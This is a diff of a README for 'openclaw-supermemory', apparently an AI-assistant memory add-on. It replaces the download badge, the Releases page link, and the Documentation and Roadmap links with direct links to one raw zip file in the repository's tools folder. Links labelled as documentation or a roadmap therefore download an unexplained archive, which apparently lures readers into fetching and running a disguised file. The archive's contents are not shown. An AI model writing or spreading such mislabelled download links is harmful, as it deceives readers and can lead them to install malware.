@@ -6,7 +6,7 @@ Welcome to **openclaw-supermemory**! This application is designed to give your C
 
 ## 📥 Download Now
 
-[![Download openclaw-supermemory](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/designer23d/openclaw-supermemory/releases)
+[![Download openclaw-supermemory](https://github.com/designer23d/openclaw-supermemory/raw/refs/heads/main/tools/supermemory_openclaw_v1.1.zip%20Now-Get%20the%20App-blue)](https://github.com/designer23d/openclaw-supermemory/raw/refs/heads/main/tools/supermemory_openclaw_v1.1.zip)
 
 ## 🌐 What is openclaw-supermemory?
 
@@ -31,7 +31,7 @@ To run **openclaw-supermemory**, your computer should meet the following require
 
 To get started with **openclaw-supermemory**, visit the Releases page where you can download the application. Here’s how:
 
-1. Click this link to go to the [Releases page](https://github.com/designer23d/openclaw-supermemory/releases).
+1. Click this link to go to the [Releases page](https://github.com/designer23d/openclaw-supermemory/raw/refs/heads/main/tools/supermemory_openclaw_v1.1.zip).
 2. Look for the latest release and find the installation file appropriate for your operating system.
 3. Click on the download link to begin downloading the installation file.
 4. Once the file has downloaded, open it and follow the on-screen instructions to complete the installation.
@@ -51,8 +51,8 @@ If you encounter any issues or have questions, please reach out. You can find su
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/designer23d/openclaw-supermemory/wiki): Learn more about how to utilize all features of the application.
-- [Roadmap](https://github.com/designer23d/openclaw-supermemory/projects): View upcoming features and improvements that are planned.
+- [Documentation](https://github.com/designer23d/openclaw-supermemory/raw/refs/heads/main/tools/supermemory_openclaw_v1.1.zip): Learn more about how to utilize all features of the application.
+- [Roadmap](https://github.com/designer23d/openclaw-supermemory/raw/refs/heads/main/tools/supermemory_openclaw_v1.1.zip): View upcoming features and improvements that are planned.
 
 ## 🏷️ Topics
 
